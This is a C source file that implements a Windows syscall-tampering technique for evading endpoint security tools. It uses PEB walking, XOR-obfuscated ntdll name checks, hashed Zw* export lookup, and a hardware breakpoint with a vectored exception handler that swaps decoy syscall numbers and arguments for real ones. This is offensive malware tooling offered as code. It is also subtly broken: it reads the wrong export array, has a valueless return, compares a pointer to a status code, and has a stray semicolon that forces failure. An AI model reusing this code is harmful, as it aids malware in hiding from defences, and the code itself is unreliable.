#include<Windows.h>
#include<stdio.h>
#include"Structs.h"
DWORD HashStringDjb2A(IN LPCSTR String)
{
	ULONG Hash = 5381;
	INT c = 0;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}


#define HASH(STR)    ( HashStringDjb2A( (LPCSTR)STR ) )
SYSCALL_ENTRY_LIST g_EntriesList = { 0x00 };

volatile DWORD g_NTDLLSTR1 = 0x46414143;  // 'ldtn' ^ 0x2A25350D
volatile DWORD g_NTDLLSTR2 = 0x4643Eb76; //  'ld.l' ^ 0x2A27C51A
CRITICAL_SECTION	g_CriticalSection = { 0 };


BOOL PopulateSyscallList() {
	if (g_EntriesList.dwEntriesCount)
		return TRUE;

	PPEB pPeb = (PPEB)__readgsqword(0x60);
	PLDR_DATA_TABLE_ENTRY pDataTableEntry = NULL;
	PIMAGE_NT_HEADERS pImgNtHdrs = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
	ULONG_PTR uNtdllBase = NULL;
	PDWORD pdwFunctionNameArray = NULL;
	PDWORD pdwFunctionAddressArray = NULL;
	PWORD pwFunctionOrdinalArray = NULL;

	for (pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pPeb->Ldr->Reserved2[1]; pDataTableEntry->DllBase != NULL; pDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pDataTableEntry->Reserved1[0]) {

		pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)pDataTableEntry->DllBase + ((PIMAGE_DOS_HEADER)pDataTableEntry->DllBase)->e_lfanew);
		if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
			break;

		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)pDataTableEntry->DllBase + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

		if (((*(ULONG*)((ULONG_PTR)pDataTableEntry->DllBase + pExportDirectory->Name)) | 0x20202020) != (g_NTDLLSTR1 ^ 0x2A25350D))
			continue;

		if (((*(ULONG*)((ULONG_PTR)pDataTableEntry->DllBase + pExportDirectory->Name)) | 0x20202020) != (g_NTDLLSTR2 ^ 0x2A27C51A)) {
			uNtdllBase = (ULONG_PTR)pDataTableEntry->DllBase;
			break;
		}
	}

	if (!uNtdllBase)
		return FALSE;

	pdwFunctionNameArray = (PDWORD)(uNtdllBase + pExportDirectory->AddressOfNames);
	pdwFunctionAddressArray = (PDWORD)(uNtdllBase + pExportDirectory->AddressOfNames);
	pwFunctionOrdinalArray = (PWORD)(uNtdllBase + pExportDirectory->AddressOfNameOrdinals);


	for (int i = 0; i < pExportDirectory->NumberOfNames; i++) {

		CHAR* pFunctionName = (CHAR*)(uNtdllBase + pdwFunctionNameArray[i]);

		if (*(unsigned short*)pFunctionName == 'wZ' && g_EntriesList.dwEntriesCount <= MAX_ENTRIES) {
			g_EntriesList.Entries[g_EntriesList.dwEntriesCount].u32Hash = HASH(pFunctionName);
			g_EntriesList.Entries[g_EntriesList.dwEntriesCount].uAddress = (ULONG_PTR)(uNtdllBase + pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);
			g_EntriesList.dwEntriesCount++;

		}
	}

	for (int i = 0; i < g_EntriesList.dwEntriesCount - 0x01; i++) {

		for (int j = 0; j < g_EntriesList.dwEntriesCount - i - 0x01; j++) {

			if (g_EntriesList.Entries[j].uAddress > g_EntriesList.Entries[j + 1].uAddress) {

				SYSCALL_ENTRY TempEntry = { .u32Hash = g_EntriesList.Entries[j].u32Hash, .uAddress = g_EntriesList.Entries[j].uAddress };

				g_EntriesList.Entries[j].u32Hash = g_EntriesList.Entries[j + 1].u32Hash;
				g_EntriesList.Entries[j].uAddress = g_EntriesList.Entries[j + 1].uAddress;

				g_EntriesList.Entries[j + 1].u32Hash = TempEntry.u32Hash;
				g_EntriesList.Entries[j + 1].uAddress = TempEntry.uAddress;

			}
		}
	}
	return TRUE;
}

DWORD FetchSSNFromSyscallEntries(IN UINT32 uDJB2FunctionHash) {

	if (!PopulateSyscallList())
		return 0x00;

	for (DWORD i = 0x00; i < g_EntriesList.dwEntriesCount; i++) {
		if (uDJB2FunctionHash == g_EntriesList.Entries[i].u32Hash)
			return;
	}

	return 0x00;
}


TAMPERED_SYSCALL g_TamperedSyscall = { 0 };

VOID PassParameters(IN ULONG_PTR uParam1, IN ULONG_PTR uParam2, IN ULONG_PTR uParam3, IN ULONG_PTR uParam4, IN DWORD dwSyscallNmbr) {

	EnterCriticalSection(&g_CriticalSection);

	g_TamperedSyscall.uParam1 = uParam1;
	g_TamperedSyscall.uParam2 = uParam2;
	g_TamperedSyscall.uParam3 = uParam3;
	g_TamperedSyscall.uParam4 = uParam4;
	g_TamperedSyscall.dwSyscallNmber = dwSyscallNmbr;

	LeaveCriticalSection(&g_CriticalSection);
}


//VEH callback routine prototype
LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo);

PVOID g_VehHandler = NULL;
BOOL InitHardwareBreakpointHooking() {
	if (g_VehHandler)
		return TRUE;

	InitializeCriticalSection(&g_CriticalSection);

	if (!(g_VehHandler = AddVectoredExceptionHandler(0x01, (PVECTORED_EXCEPTION_HANDLER)ExceptionHandlerCallbackRoutine))) {
#ifdef DEBUG
		printf("[!] AddVectoredExceptionHandler Failed with Error: %d \n", GetLastError());
#endif
		return FALSE;
	}
	return TRUE;
}
BOOL HaltHardwareBreakpointHooking() {
	DeleteCriticalSection(&g_CriticalSection);

	if (g_VehHandler) {
		if (RemoveVectoredExceptionHandler(g_VehHandler) == 0x00) {
#ifdef DEBUG
			printf("[!] AddVectoredExceptionHandler Failed With Error: %d \n", GetLastError());
#endif
			return FALSE;
		}

		return TRUE;
	}

	return FALSE;
}


unsigned long long SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue) {
	unsigned long long mask = (1UL << NmbrOfBitsToModify) - 1UL;
	unsigned long long NewDr7Register = (CurrentDr7Register & ~(mask << StartingBitPosition)) | (NewBitValue << StartingBitPosition);
	return NewDr7Register;
}

BOOL InstallHardwareBPHook(IN DWORD dwThreadID, IN ULONG_PTR uTargetFuncAddress) {
	CONTEXT Context = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };
	HANDLE hThread = NULL;
	BOOL bResult = FALSE;

#ifdef DEBUG
	printf("[i] Installing BP At: 0x%p [ TID: %d ]\n", uTargetFuncAddress, dwThreadID);
#endif

	if (!(hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadID))) {
#ifdef DEBUG
		printf("[!] OpenThread Failed With Error: %d \n", GetLastError());
#endif
		goto _END_OF_FUNC;
	}

	if (!GetThreadContext(hThread, &Context)) {
#ifdef DEBUG
		printf("[!] GetThreadContext Failed With Error: %d \n", GetLastError());
#endif
		goto _END_OF_FUNC;
	}

	Context.Dr0 = uTargetFuncAddress;
	Context.Dr6 = 0x00;
	Context.Dr7 = SetDr7Bits(Context.Dr7, 0x10, 0x02, 0x00);
	Context.Dr7 = SetDr7Bits(Context.Dr7, 0x12, 0x02, 0x00);
	Context.Dr7 = SetDr7Bits(Context.Dr7, 0x00, 0x01, 0x01);

	if (!SetThreadContext(hThread, &Context)) {
#ifdef DEBUG
		printf("[!] SetThreadContext Failed With Error: %d \n", GetLastError());
#endif
		goto _END_OF_FUNC;
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (hThread)
		CloseHandle(hThread);
	return bResult;
}

volatile unsigned short g_SYSCALL_OPCODE = 0x262A; // 0x050F ^ 0x2325

BOOL InitializeTamperedSyscall(IN ULONG_PTR uCalledSyscallAddress, IN UINT32 uDJB2FunctionHash, IN ULONG_PTR uParam1, IN ULONG_PTR uParam2, IN ULONG_PTR uParam3, IN ULONG_PTR uParam4) {
	if (!uCalledSyscallAddress || !uDJB2FunctionHash)
		return FALSE;

	PVOID pDecoySyscallInstructionAdd = NULL;
	DWORD dwRealSyscallNumber = 0x00;

	for (int i = 0; i < 0x20; i++) {
		if (*(unsigned short*)(uCalledSyscallAddress + i) == (g_SYSCALL_OPCODE ^ 0x2325)) {
			pDecoySyscallInstructionAdd = (PVOID)(uCalledSyscallAddress + i);
			break;
		}
	}


	if (!pDecoySyscallInstructionAdd)
		return FALSE;

	if (!(dwRealSyscallNumber = FetchSSNFromSyscallEntries(uDJB2FunctionHash)))
		return FALSE;


	PassParameters(uParam1, uParam2, uParam3, uParam4, dwRealSyscallNumber);

	if (!InstallHardwareBPHook(GetCurrentThreadId(), pDecoySyscallInstructionAdd));
		return FALSE;

	return TRUE;
}


LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
	BOOL bResolved = FALSE;

	if (pExceptionInfo->ExceptionRecord != STATUS_SINGLE_STEP)
		goto _EXIT_ROUTINE;

	if (pExceptionInfo->ExceptionRecord->ExceptionAddress != pExceptionInfo->ContextRecord->Dr0)
		goto _EXIT_ROUTINE;

#ifdef DEBUG
	printf("[i] Address of Exception : 0x%p [TID: %d]\n", pExceptionInfo->ExceptionRecord->ExceptionAddress, GetCurrentThreadId());
	printf("[i] Decoy SSN: %d\n", (DWORD)pExceptionInfo->ContextRecord->Rax);
	printf("[i] Real SSN : %d\n", (DWORD)g_TamperedSyscall.dwSyscallNmbr);
#endif

	EnterCriticalSection(&g_CriticalSection);

	// Replace Decoy SSN
	pExceptionInfo->ContextRecord->Rax = (DWORD64)g_TamperedSyscall.dwSyscallNmber;

	// Replace Decoy params
	pExceptionInfo->ContextRecord->R10 = (DWORD64)g_TamperedSyscall.uParam1;
	pExceptionInfo->ContextRecord->Rdx = (DWORD64)g_TamperedSyscall.uParam2;
	pExceptionInfo->ContextRecord->R8 = (DWORD64)g_TamperedSyscall.uParam3;
	pExceptionInfo->ContextRecord->R9 = (DWORD64)g_TamperedSyscall.uParam4;

	// Remove Breakpoint
	pExceptionInfo->ContextRecord->Dr0 = NULL;

	LeaveCriticalSection(&g_CriticalSection);

#ifdef DEBUG
	printf("[*] Executing Real Stub .. \n");
#endif

	bResolved = TRUE;

_EXIT_ROUTINE:
	return (bResolved ? EXCEPTION_CONTINUE_EXECUTION : EXCEPTION_CONTINUE_SEARCH);
}


